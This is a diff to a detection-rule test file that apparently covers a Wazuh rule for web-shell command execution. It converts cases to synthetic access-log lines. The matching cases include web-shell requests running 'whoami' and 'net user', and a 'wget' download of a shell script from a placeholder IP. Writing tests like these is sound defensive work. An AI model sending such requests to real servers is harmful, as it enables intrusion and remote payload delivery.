@@ -1,19 +1,21 @@
+# Synthetic lines in raw log format; IPs are from RFC 5737 documentation ranges.
+wazuh_rule: 100163
 cases:
   - description: whoami through cmd parameter
     expect: match
-    event: {cs-method: GET, cs-uri-stem: /uploads/image.php, cs-uri-query: "cmd=whoami", sc-status: 200}
+    raw: '203.0.113.9 - - [28/Sep/2026:10:00:00 +0000] "GET /uploads/image.php?cmd=whoami HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
   - description: downloader via exec parameter
     expect: match
-    event: {cs-method: GET, cs-uri-stem: /shell.jsp, cs-uri-query: "exec=wget%20http://198.51.100.9/x.sh", sc-status: 200}
+    raw: '203.0.113.9 - - [28/Sep/2026:10:00:01 +0000] "GET /shell.jsp?exec=wget%20http://198.51.100.9/x.sh HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
   - description: command chained after another parameter
     expect: match
-    event: {cs-method: GET, cs-uri-stem: /admin/tools.aspx, cs-uri-query: "t=1&c=net+user", sc-status: 200}
+    raw: '203.0.113.9 - - [28/Sep/2026:10:00:02 +0000] "GET /admin/tools.aspx?t=1&c=net+user HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
   - description: cmd parameter on a static file is not a script
     expect: no_match
-    event: {cs-method: GET, cs-uri-stem: /help.html, cs-uri-query: "cmd=ls", sc-status: 200}
+    raw: '203.0.113.9 - - [28/Sep/2026:10:00:03 +0000] "GET /help.html?cmd=ls HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
   - description: word that only starts like a command
     expect: no_match
-    event: {cs-method: GET, cs-uri-stem: /index.php, cs-uri-query: "cmd=identity-check", sc-status: 200}
+    raw: '203.0.113.9 - - [28/Sep/2026:10:00:04 +0000] "GET /index.php?cmd=identity-check HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
   - description: unrelated parameter name
     expect: no_match
-    event: {cs-method: GET, cs-uri-stem: /index.php, cs-uri-query: "page=whoami", sc-status: 200}
+    raw: '203.0.113.9 - - [28/Sep/2026:10:00:05 +0000] "GET /index.php?page=whoami HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
